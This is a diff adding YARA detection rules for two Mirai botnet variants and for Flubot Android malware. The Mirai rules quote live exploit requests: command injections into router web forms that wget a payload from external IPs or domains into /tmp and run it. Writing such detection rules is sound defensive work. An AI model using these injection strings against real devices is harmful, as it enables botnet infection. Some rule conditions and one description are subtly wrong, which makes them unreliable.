@@ -2229,3 +2229,68 @@ rule android_meterpreter : android
     condition:
 	any of ($check*) or any of ($stop*)
 }
+
+rule Linux_ARCH68K_Mirai_Variant_2022_03_15 {
+  meta:
+    description = "Detects new ARCH68K Mirai variant"
+    author      = "Mehmet Ali Kerimoglu a.k.a. CYB3RMX"
+    date        = "2022-03-15"
+    hash1       = "0519f412cb9932cb961d9707d19a8cdeb61955a4587bd98d3de9b8be1059f7f1"
+
+  strings:
+    $request1 = "POST /GponForm/diag_Form?style/ HTTP/1.1" wide ascii
+    $request2 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1" wide ascii
+    $request3 = "GET /shell?cd+/tmp;rm+-rf+*;wget+ jswl.jdaili.xyz/jaws;sh+/tmp/jaws HTTP/1.1" wide ascii
+    $request4 = "User-Agent: Hello, World" wide ascii
+    $request5 = "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+http://209.141.33.141/bin+-O+/tmp/gaf;sh+/tmp/gaf`&ipv=0" wide ascii
+    $request6 = "dslf-config" wide ascii
+    $request7 = "/bin/busybox wget -g jswl.jdaili.xyz -l /tmp/.hiroshima -r /596a96cc7bf9108cd896f33c44aedc8a/db0fa4b8db0333367e9bda3ab68b8042.mips" wide ascii
+
+  condition:
+    uint16(0) == 0x457f and (5 or all of ($request*))
+}
+
+rule Linux_PPC_Mirai_Variant_2022_03_18 {
+  meta:
+    description = "Detects new ARM Mirai variant"
+    author      = "Mehmet Ali Kerimoglu a.k.a. CYB3RMX"
+    date        = "2022-03-18"
+    hash1       = "06e3d1eaaacf8bd63daedb8f112a9ec9f6bd3cd637808c4f564001869cad0f40"
+
+  strings:
+    $reqstr1 = "GET /ping.cgi?pingIpAddress=google.fr;wget%20http://104.244.77.57/bins/Rakitin.mips%20-O%20-%3E%20/tmp/jno;sh%20/tmp/jno%27/&sessionKey=1039230114'$ HTTP/1.1" wide ascii
+    $reqstr2 = "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+http://45.90.162.98/bins/Rakitin.sh+-O+/tmp/gaf;sh+/tmp/gaf`&ipv=0" wide ascii
+    $reqstr3 = "45.90.162.98" wide ascii
+
+  condition:
+    uint16(0) == 0x457f and (3 or all of ($reqstr*))
+}
+
+rule TELEKOM_SECURITY_Android_Flubot: FILE {
+  meta:
+    description = "matches on dumped, decrypted V/DEX files of Flubot version > 4.2"
+    author      = "Thomas Barabosch, Telekom Security"
+    id          = "d6d1eebc-961f-5032-af04-4c95f364a74d"
+    date        = "2021-09-14"
+    modified    = "2021-09-14"
+    reference   = "https://github.com/telekom-security/malware_analysis/"
+    source_url  = "https://github.com/telekom-security/malware_analysis//blob/bf832d97e8fd292ec5e095e35bde992a6462e71c/flubot/flubot.yar#L1-L19"
+    license_url = "N/A"
+    hash        = "37be18494cd03ea70a1fdd6270cef6e3"
+    logic_hash  = "db22e0890dfad7cb9cb1d18aadb406514e5e8874051aa7f07a4bb93da9db68df"
+    score       = 75
+    quality     = 45
+    tags        = "FILE"
+    version     = "20210720"
+
+  strings:
+    $dex  = "dex"
+    $vdex = "vdex"
+    $s1   = "LAYOUT_MANAGER_CONSTRUCTOR_SIGNATURE"
+    $s2   = "java/net/HttpURLConnection;"
+    $s3   = "java/security/spec/X509EncodedKeySpec;"
+    $s4   = "MANUFACTURER"
+
+  condition:
+    ($dex at 0 or $vdex at 0) and 3 of ($s*)
+}
